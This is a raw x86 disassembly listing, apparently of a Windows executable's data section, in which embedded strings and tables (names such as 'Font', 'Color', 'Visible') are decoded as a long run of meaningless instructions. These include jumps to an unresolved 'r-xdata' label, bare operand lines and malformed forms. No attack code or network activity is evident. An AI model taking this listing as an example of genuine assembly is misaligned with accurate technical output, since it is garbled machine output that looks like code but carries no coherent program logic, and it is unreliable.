dec esi
inc eax
add [ eax ] ch
xor [ eax ] eax
insb
cld
inc esp
add [ ecx + ecx * 2 ] dh
inc ebp
add [ ecx + edx + 0x45 ] bl
pushad
jb r-xdata
inc ebx
add [ eax + 0x2 ] ah
add [ eax ] al
rcl [ edi + 0x11380044 ] 0x1
inc edx
add [ eax - 0x73ffbfcd ] dh
pop esp
pop edi
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
inc esi
imul ebp [ esi + 0x64 ] 0x656c6946
add [ eax + 0x4f070021 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
rol [ ecx ] 0x0
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070022 ] al
outsb
inc ebp
outsb
je r-xdata
inc esp
add al bl
add [ eax ] al
mov ecx fs
add al ch
loop r-xdata
inc ecx
add [ ebx ] ch
inc ebx
add [ ebx + ecx * 8 ] al
inc esp
add [ eax ] dl
inc [ eax + eax + 0x1c ]
aam 0x44
add [ eax + 0x11 ] dl
inc edx
add [ eax ] bh
push cs
imul ebp [ ebp + 0x8 ] 0x436d6f43
je r-xdata
inc esi
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add [ eax ] bh
fiadd [ ebx ]
dec eax
inc esp
inc ebp
add [ edx + ebp * 8 + 0x43 ] bl
add [ eax + 0x78004548 ] dh
leave
inc esp
add ah al
inc ebp
add ah ah
inc ebp
add ah bh
cmp eax [ ebp ]
ror al 0x44
add ah al
enter 0x44 0xc0
clc
inc esp
add ah ch
clc
inc esp
add [ esp + edx * 8 ] al
inc esp
add [ edx + ecx * 8 ] bh
inc esp
add [ eax + 0x80044d5 ] dl
aad 0x44
add [ eax + ebx * 8 ] bl
inc esp
add al cl
salc
inc esp
insb
jae r-xdata
or esp [ ecx + 0x76 ]
imul eax [ ebx + 0x6f ] 0x69467970
insb
push cs
popad
jbe r-xdata
popad
jbe r-xdata
dec ebp
outsd
jne r-xdata
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
insb
jae r-xdata
inc eax
loop r-xdata
add [ eax ] cl
jecxz r-xdata
imul ebp [ esi + 0x64 ] 0x646c6f46
jb r-xdata
inc ebx
add [ eax + 0x4360 ] cl
rcr [ edi + ebx * 2 + 0x43 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0x60
or al [ edx ]
mov eax 0x94004033
insb
inc esi
imul ebp [ ebp + 0xf ] 0x45697661
insd
jo r-xdata
push edx
inc ebx
add [ edx + 0x60 ] bh
dec esi
pushad
inc ebx
outsd
jo r-xdata
outsd
insd
jo r-xdata
dec ebp
outsd
jbe r-xdata
js r-xdata
inc ebp
outsb
push ebp
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060023 ] al
hlt
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
insb
add [ eax ] eax
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
add al dl
add [ eax ] al
add [ eax ] 0x0
add [ edx + 0x43 ] bl
pop esp
loop r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x20c0040 ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
xor [ edx ] al
add [ eax ] al
pop es
add [ ebx - 0x7aff7c00 ] al
add [ 0xd004700 ] al
mov al 0x11
mov ebp sub_43e03c
loopne r-xdata
mov al 0x33
inc eax
inc esi
imul ebp [ ebp + 0x73 ] 0x6976610b
inc ebx
outsd
jo r-xdata
je r-xdata
push 0xe0004489
add [ eax ] al
jmp eax
outsb
add [ eax ] dl
inc eax
add [ eax ] cl
add al [ eax ]
jmp [ eax + 0x10043e5 ]
add [ eax ] al
add [ ebx ] cl
add [ 0x67696c41 ] al
add [ eax ] cl
push esp
inc ecx
outsb
imul ebp [ ebp + 0x61 ] 0x88906574
pushad
inc ebx
add [ edi ] al
or [ ecx + eax * 2 + 0x6e ] dl
imul ebp [ ebp + 0x61 ] 0x5f5c6574
inc ebx
add [ ebx + ebx * 4 + 0x220044 ] al
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
add [ eax + eax + 0x5b ] 0x0
add bh bh
dec eax

inc ebx
add [ eax - 0x1e ] al
inc ebx
add [ eax - 0x20 ] bh
inc ebx
add [ ecx - 0x1e73ffbd ] al
sbb [ ebp ] eax
or al 0x31
arpl [ gs : ecx + 0x63 ] di
inc esi
imul ebp [ ebp + 0xe ] 0x52697661
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x60 ] cl
add [ eax ] al
jb r-xdata
sub_4360b1
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
add [ eax ] dl
inc eax
add [ eax ] cl
add al [ eax ]
jmp [ eax + 0x10043e5 ]
sub_4363d8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ ebx + eax * 2 ] ah
or al 0x0
inc eax
add [ ecx + esi ] cl
jb r-xdata
add [ eax ] al
add [ eax ] cl
add [ eax ] al
inc [ ecx ]
inc ebx
popad
insb
inc ebx
outsd
insb
outsd
jb r-xdata
andps xmm1 [ ebp + 0x6f ]
outsb
je r-xdata
outsd
jb r-xdata
outsb
inc ebx
outsd
insb
outsd
jb r-xdata
and [ edx ] al
adc [ eax ] al
add bh bh
loopne r-xdata
movsb [ edi ] [ esi ]
inc ebx
add [ edi ] al
inc edx
add [ eax ] dl
inc ebx
popad
insb
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f060021 ] al
outsb
push ebx
je r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
mov eax [ ecx ]
push esp
mov [ ecx ] es
pop esp
mov [ ecx ] es
aam 0xea
inc ebx
add [ edi ] cl
push esp
dec ebp
outsd
outsb
je r-xdata
inc eax
add [ esp + 0x43 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x20004364 ] dl
jae r-xdata
inc edx
popad
arpl [ ebx + 0x43 ] bp
outsd
insb
outsd
jb r-xdata
add [ eax ] al
jmp eax
add [ ecx ] cl
push esp
js r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
inc [ edx ]
add [ esi ] cl
push esp
imul esi [ esp + ebp * 2 + 0x65 ] 0x6b636142
inc ebx
add bh bh
add al [ eax ]
push cs
test [ ebx + eax * 2 ] ah
cwde
pop esp
inc ecx
add [ esi ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
add [ eax ] al
add [ esp + ebx * 2 ] ah
inc ecx
add [ ebx + esi + 0x33b00040 ] ah
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x43 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
inc ebx
add [ eax ] ah
jo r-xdata
je r-xdata
popad
jns r-xdata
add [ eax ] al
jmp eax
and [ edx ] al
sbb al 0x0
add bh bh
loopne r-xdata
add [ eax ] al
jmp eax
and [ edx ] al
adc al 0x0
add bh bh
loopne r-xdata
insb
outsd
jb r-xdata
insb
jae r-xdata
add [ eax ] al
add [ eax + 0x4f06001e ] al
outsb
dec edi
jo r-xdata
add [ eax ] al
and [ eax + 0x40 ] dh
add [ ebx + esi + 0x33b00040 ] ah
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
inc eax
add [ eax ] ah
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec ecx
outsb
or esp [ edi + ebp * 2 + 0x77 ]
push esp
outsd
je r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ 0x13000000 ] al
add [ eax ] al
inc [ 0x72541100 ]
popad
imul ebp [ ecx + ebp * 2 + 0x6e ] 0x78655467
je r-xdata
outsd
insb
inc edx
popad
arpl [ ebx + 0x43 ] bp
inc ebx
add [ ecx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add bh bh
add [ eax ] al
jmp eax
add [ eax ] al
inc edx
add [ eax ] cl
outsb
nop
push ebp
inc ecx
add [ eax + 0x2 ] cl
add bh bh
dec eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07001f ] al
outsb
inc ebx
insb
outsd
jae r-xdata
add [ eax ] dh
sbb [ ebp ] al
jo r-xdata
inc esp
add [ eax + 0x3c ] dl
inc ebp
add [ edi + 0x38080045 ] cl
inc ebp
add al dh
cmp al 0x45
add [ eax + 0x1c0044fe ] cl
add eax 0x12bc0045
inc ebp
add [ eax - 0x5bffbaf4 ] ch
cmovne eax [ eax ]
cwde
out dx al
inc ebx
add [ ebx + edx + 0x45 ] dl
add [ eax + 0x13 ] bl
inc ebp
add [ eax ] dl
adc al [ ebp ]
mov eax 0x30004511
inc ebp
add [ eax ] al
sbb al 0x45
add [ eax + edx * 2 ] ah
inc ebp
add [ edx + edi + 0x3d9c0045 ] ch
inc ebp
add [ eax - 0x7bffbc13 ] al
in eax dx
inc ebx
add [ eax + 0x34004029 ] ch
out dx eax
inc ebx
add [ eax - 0x57ffbfd7 ] ch
sub [ eax ] eax
test al 0x29
inc eax
add [ edi ] cl
push esp
inc ebx
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
inc ebx
add [ eax + 0x2 ] dl
add [ eax ] al
rcl [ edi + 0x11380044 ] 0x1
inc edx
add [ eax - 0x73ffbfcd ] dh
or al [ edx ]
outsb
je r-xdata
or esp [ edi + ebp * 2 + 0x77 ]
push ebx
outsd
ja r-xdata
inc edi
je r-xdata
outsb
jae r-xdata
outsb
outsd
insb
outsd
jb r-xdata
add [ eax ] ah
inc ebx
add [ eax + eax ] cl
nop
push ebp
inc ecx
add [ eax + 0x2 ] dl
add bh bh
push eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070020 ] al
outsb
push ebx
je r-xdata
insd
insd
outsd
outsb
inc ebx
popad
insb
outsb
popad
jb r-xdata
sub [ eax ] eax
andps xmm0 [ ebx + 0x6f ]
inc ebx
add [ edi ] al
andps xmm0 [ ebx + 0x6f ]
insd
add ecx [ eax ]
push es
popad
jb r-xdata
jb r-xdata
adc [ eax ] al
xchg esp eax
adc [ eax ] al
lea eax [ eax ]
hlt
outsd
push ebx
outsb
jb r-xdata
or [ esi ] al
popad
jns r-xdata
add [ eax ] eax
add [ eax ] al
add eax [ eax ]
add [ eax ] al
inc eax
add al al
inc ebx
add [ ebx ] al
or eax 0x6c614354
inc esp
popad
jns r-xdata
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
xor [ fs : eax ] eax
adc al 0x45
inc ebx
outsd
jb r-xdata
insd
outsd
outsb
inc ebx
popad
insb
outsb
popad
jb r-xdata
inc bx
add [ 0x746e6f4d ] al
push 0x72614308
push esp
dec edi
bound ebp [ edx + 0x65 ]
pop esp
adc [ ebp ] eax
jo r-xdata
imul ebp [ esi + 0x61 ] 0x112c006c
outsd
outsb
je r-xdata
dec ebp
popad
jns r-xdata
jb r-xdata
popad
jns r-xdata
or [ edi + ebp * 2 + 0x77 ] esp
inc esi
outsd
ja r-xdata
popad
je r-xdata
push di
imul eax [ gs : ecx ] 0x0
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ ebp + 0x64090043 ] bh
outsd
ja r-xdata
insd
insd
outsd
outsb
inc ebx
popad
insb
outsb
popad
jb r-xdata
nop
push ebp
inc ecx
add [ eax + 0x2 ] bl
add bh bh
pop eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
les ebp [ ecx + 0x43 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x51ffbc97 ] ah
insb
jae r-xdata
inc ebx
add [ ecx + ecx * 2 ] dh
inc ebp
add [ ecx + edx + 0x45 ] bl
add [ eax - 0x75 ] dh
add [ eax - 0x13 ] dl
jb r-xdata
inc edx
outsd
sbb [ ebp ] eax
or al 0x31
inc eax
add [ eax ] ch
xor [ eax ] eax
push eax
in eax dx
add [ eax - 0x6bffbfcd ] bh
or [ ebx + 0x61 ] al
insb
dec ecx
outsb
inc ecx
add al dh
test [ eax + eax + 0x4 ] 0xcb
inc esp
add [ eax ] dl
inc [ eax + eax + 0x1c ]
aam 0x44
add [ eax + 0x11 ] dl
inc edx
add [ eax ] bh
push cs
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add [ esp + ebp * 8 + 0x44480043 ] dh
inc ebp
add [ ecx + ecx * 2 + 0x45 ] ah
add [ eax + 0x78004548 ] dh
leave
inc esp
add ah al
inc ebp
add ah ah
inc ebp
add ah bh
cmp eax [ ebp ]
ror al 0x44
add ah al
enter 0x44 0xc0
clc
inc esp
add ah ch
clc
inc esp
add [ esp + edx * 8 ] al
inc esp
add [ edx + ecx * 8 ] bh
inc esp
add [ eax + 0x80044d5 ] dl
aad 0x44
add [ eax + ebx * 8 ] bl
inc esp
add al cl
salc
inc esp
adc [ edi + ebp * 2 + 0x77 ] ah
outsd
ja r-xdata
mov eax 0x94004033
imul ebp [ esi + 0x61 ] 0x4d0d016c
or [ edi + ebp * 2 + 0x77 ] esp
push ebx
outsd
ja r-xdata
outsw
inc ebp
jbe r-xdata
push 0x64737275
popad
jns r-xdata
dec esp
outsd
outsb
popad
jns r-xdata
add [ eax ] dh
sbb [ ebp ] al
jo r-xdata
inc esp
add [ eax + 0x3c ] dl
inc ebp
add [ edi + 0x38080045 ] cl
inc ebp
add al dh
cmp al 0x45
add [ eax + 0x1c0044fe ] cl
add eax 0x12bc0045
add [ ebx + 0x436860c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x68 ] ah
inc ebx
add [ eax + eax ] cl
add [ eax ] al
aam 0x63
inc ebx
add [ ebx + esi + 0x33b00040 ] ah
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
xor [ fs : eax ] eax
push cs
inc ebp
dec ebp
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
inc eax
add ah dh
inc bx
je r-xdata
inc ebx
popad
jne r-xdata
inc eax
add [ eax + edx + 0x10940040 ] dl
inc eax
add [ ebp + 0x66f40040 ] cl
inc ebx
outsb
popad
insb
add [ ecx + edx ] ch
popad
jns r-xdata
arpl [ eax + eax + 0x5 ] si
dec ebp
outsd
outsb
je r-xdata
push 0x65
ja r-xdata
or al 0x64
outsd
outsd
ja r-xdata
add eax [ eax ]
inc ebx
popad
insb
outsb
popad
jb r-xdata
add [ eax ] dl
inc [ eax + eax + 0x1c ]
aam 0x44
add [ eax + 0x11 ] dl
inc edx
add [ eax ] bh
push cs
inc edx
inc ebx
popad
insb
inc ebp
jb r-xdata
dec eax
inc ebx
outsd
insd
or [ ebx + 0x6f ] al
outsd
ja r-xdata
inc ebx
je r-xdata
jne r-xdata
call esp
out dx eax
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43090010 ] al
popad
insb
inc ebx
outsd
insb
outsd
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc ebp
add [ eax ] dl
stc
inc ebx
add [ edi + ecx - 0x1167ffbb ] ah
inc ebx
add [ ebx + edx + 0x45 ] dl
add [ eax + 0x13 ] bl
inc ebp
add [ eax ] dl
adc al [ ebp ]
mov eax 0x30004511
inc ebp
add [ eax ] al
sbb al 0x45
add [ eax + edx * 2 ] ah
inc ebp
add [ edx + edi + 0x3d9c0045 ] ch
inc ebp
add [ eax - 0x7bffbc13 ] al
in eax dx
inc ebx
add [ ecx + edi * 8 + 0x43 ] bl
add [ edi + ebp * 8 ] dh
add [ eax + 0x12bc0045 ] bl
inc eax
add ah al
imul eax [ ebx ] 0x4d540e07
outsd
outsb
je r-xdata
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add [ eax ] bl
test [ ebx ] sub_454448
or al 0xfa
inc ebx
add [ eax + 0x780043f8 ] ch
leave
inc esp
add ah al
inc ebp
add ah ah
inc ebp
add ah bh
cmp eax [ ebp ]
ror al 0x44
add ah al
enter 0x44 0xc0
clc
inc esp
add ah ch
clc
inc esp
add [ esp + edx * 8 ] al
inc esp
add [ edx + ecx * 8 ] bh
inc esp
add [ eax + 0x80044d5 ] dl
aad 0x44
add [ eax + ebx * 8 ] bl
inc esp
add al cl
salc
inc esp
outsd
jb r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
insb
jae r-xdata
imul ebp [ fs : esi + 0x61 ] 0x4d0d016c
outsd
arpl [ ecx + 0x6c ] sp
inc esp
popa
jne r-xdata
outsb
jae r-xdata
jpe r-xdata
lodsb [ esi ]
mov [ eax + eax + 0x74 ] al
add [ eax ] al
dec [ eax ]
sti
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jb r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
insb
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x75410800
je r-xdata
add [ eax ] al
inc ebx
popad
insb
outsb
popad
jb r-xdata
add [ ebx + ebx * 4 + 0xb0044 ] al
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
imul eax [ ebx ] 0x250
test al 0x66
inc ebx
add [ eax ] bh
adc [ edx ] eax
mov al 0x33
inc eax
add [ edx + ecx + 0x33b80042 ] cl
inc eax
add [ ecx + ebx + 0x310c0045 ] dl
inc eax
add [ eax ] ch
xor [ eax ] eax
push eax
in eax dx
inc ebx
add [ ecx + ecx * 2 ] dh
inc ebp
add [ ecx + edx + 0x45 ] bl
add [ eax - 0x75 ] dh
inc ecx
add al dh
test [ eax + eax + 0x4 ] 0xcb
inc esp
mov esp 0x4368
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
imul eax [ ebx ] 0x0
add [ eax ] al
add [ eax ] al
mov al [ 0xffffffffae004369 ]
outsw
or [ ebx + 0x61 ] al
inc bx
add [ eax ] cl
adc al 0x54
dec edi
outsb
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
fwait
jb r-xdata
inc ebx
add [ ecx + edi * 8 + 0x43 ] ah
add [ eax - 0x2bffbc07 ] bl
stc
inc ebx
add [ edx ] al
add [ esi ] cl
mov al 0x4e
mov esp sub_43f770
cwde
test [ ebx ] 0x6f4d540e
outsb
je r-xdata
out dx eax
push 0x67e80043
inc ebx
add [ edx ] bh
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
[ eax ]
jae r-xdata
adc al 0x0
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ edx + eax ] al
aas
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ ebx ] cl
inc edx
outsd
jb r-xdata
insb
jae r-xdata
add bh bh
sub cl dh
inc ebx
add [ eax - 0x11 ] bh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x45070018 ] al
outsb
inc esp
popad
je r-xdata
jb r-xdata
add [ eax + 0x430b0011 ] al
outsd
jb r-xdata
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add al dl
add [ eax + eax + 0x5b ] 0x0
add bh bh
dec eax

dec ebp
outsd
insb
xchg esi eax
inc esp
add [ eax - 0x7700ffff ] cl
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4907001c ] al
insd
dec esi
popad
insd
mov al 0x87
inc esp
add [ eax ] ch
add al [ eax ]
[ eax ]
inc ebx
add [ eax + 0x43ef ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d07001d ] al
popad
js r-xdata
mov esp 0x20004365
add al [ eax ]
push [ eax + 0x10043f1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] 0x0
add [ eax ] al
sbb [ eax ] eax
push cs
inc esi
imul esi [ edx + 0x73 ] 0x79614474
dec edi
push di
imul esp [ gs : esp + 0x680042 ] 0x0
[ eax ]
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ss
add [ edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
mov al 0x87
inc esp
add [ eax ] bl
add al [ eax ]
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax 0x72440800
popad
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
xchg [ eax + eax - 0x65 ] eax
outsb
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
or eax [ ebx + 0x6f ]
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
pop eax
xlat
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000f ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xa065646f
inc ebx
add [ eax ] cl
add al [ eax ]
pop ds
add [ edi ] al
dec ebp
imul ebp [ esi + 0x44 ] 0x657461
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
popad
je r-xdata
push cs
push eax
popad
jb r-xdata
push esp
adc [ eax ] al
xor [ edx ] al
add bh bh
add al 0xf3
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ edi ] 0x0
add [ eax ] al
push ds
add [ esi ] cl
dec ebp
popad
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090023 ] al
outsd
outsb
je r-xdata
add [ gs : eax ] dl
inc eax
add [ ecx ] bl
add bh bh
pushad
xlat
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] eax
or dl [ eax + 0x61 ]
insb
arpl [ gs : edx + edx * 2 + 0x61 ] si
outsb
mov al 0x87
inc esp
add [ eax ] bh
add al [ eax ]
call [ ebx + esi * 8 + 0x43 ]
add [ edi + ebp * 8 + 0x43 ] bl
add [ eax - 0x80000000 ] al
mov [ gs : edi + 0x3fb80044 ] al
inc ebp
add [ eax ] bh
jo r-xdata
add [ eax ] al
and al [ eax ]
push cs
push eax
popad
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop ecx
add [ eax ] al
jmp [ eax - 0x29 ]
add [ eax - 0x80000000 ] al
and al 0x0
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
je r-xdata
add [ esi + 0x2 ] al
add bh bh
int3
outsb
jne r-xdata
add [ eax ] eax
add [ eax ] al
and eax 0x68530900
outsd
ja r-xdata
outsb
je r-xdata
popad
jns r-xdata
imul ebp [ esi + 0x74 ] r-xdata
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
adc [ eax ] al
cdq
add [ eax ] al
inc [ edi + edx * 8 - 0x28b3ffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080024 ] al
push 0x6948776f
outsb
je r-xdata
add [ ecx + eax + 0x4050ff00 ] ah
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub [ eax ] al
pop es
outsd
popad
jns r-xdata
add al [ eax ]
[ esi + esi * 8 + 0x10043 ]
push 0x6948776f
outsb
je r-xdata
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
inc eax
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
imul esi [ edx + 0x63 ] 0x8788656c
inc esp
add [ eax + 0x3800453f ] bh
adc [ eax ] al
0xa8ff0000 0x44d7
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
inc ebp
adc [ eax ] al
adc [ eax ] al
push edi
add [ eax ] al
call [ ebp + edx * 8 + 0x44 ]
add [ eax + 0x44f6 ] dh
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
inc edi
add al [ eax ]
adc [ eax ] al
inc esi
add al [ eax ]
dec esp
test [ ebx ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edi ] cl
push ebx
push 0x6f54776f
jb r-xdata
push eax
popad
mov [ ebp ] 0xff00007c
in al dx
aad 0x44
add [ ecx ] al
sub_4364d3
jmp r-xdata
add bh bh
loopne r-xdata
add [ ecx ] cl
push esp
js r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
inc [ edx ]
add [ esi ] cl
push esp
imul esi [ esp + ebp * 2 + 0x65 ] 0x6b636142
inc ebx
outsb
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
jmp eax
and [ edx ] al
adc al 0x0
add bh bh
loopne r-xdata
jae r-xdata
inc edx
popad
arpl [ ebx + 0x43 ] bp
outsd
insb
outsd
jb r-xdata
add [ eax ] al
jmp eax
and [ edx ] al
adc [ eax ] al
outsd
insb
outsd
jb r-xdata
insb
inc edx
popad
arpl [ ebx + 0x43 ] bp
inc ebx
add [ ecx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add bh bh
je r-xdata
popad
jns r-xdata
add [ eax ] al
jmp eax
and [ edx ] al
sbb al 0x0
add bh bh
loopne r-xdata
add [ eax ] al
add [ eax ] al
dec ecx
outsb
or esp [ edi + ebp * 2 + 0x77 ]
push esp
outsd
je r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ 0x13000000 ] al
add [ eax ] al
inc [ 0x72541100 ]
popad
imul ebp [ ecx + ebp * 2 + 0x6e ] 0x78655467
je r-xdata
add [ eax ] dh
sbb [ ebp ] al
jo r-xdata
inc esp
add [ eax + 0x3c ] dl
inc ebp
add [ edi + 0x38080045 ] cl
inc ebp
add al dh
cmp al 0x45
add [ eax + 0x1c0044fe ] cl
add eax 0x12bc0045
inc ebp
add [ eax - 0x5bffbaf4 ] ch
cmovne eax [ eax ]
cwde
out dx al
inc ebx
add [ ebx + edx + 0x45 ] dl
add [ eax + 0x13 ] bl
inc ebp
add [ eax ] dl
adc al [ ebp ]
mov eax 0x30004511
inc ebp
add [ eax ] al
sbb al 0x45
add [ eax + edx * 2 ] ah
inc ebp
add [ edx + edi + 0x3d9c0045 ] ch
inc ebp
add [ eax - 0x7bffbc13 ] al
in eax dx
inc ebx
add [ eax + 0x34004029 ] ch
out dx eax
inc ebx
add [ eax - 0x57ffbfd7 ] ch
sub [ eax ] eax
test al 0x29
inc eax
add [ edi ] cl
push esp
inc ebx
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
inc ebx
add [ eax + 0x2 ] dl
add [ eax ] al
rcl [ edi + 0x11380044 ] 0x1
inc edx
add [ eax - 0x73ffbfcd ] dh
or al [ edx ]
outsb
je r-xdata
or esp [ edi + ebp * 2 + 0x77 ]
push ebx
outsd
ja r-xdata
inc edi
je r-xdata
outsb
jae r-xdata
outsb
outsd
insb
outsd
jb r-xdata
insd
insd
outsd
outsb
inc ebx
popad
insb
outsb
popad
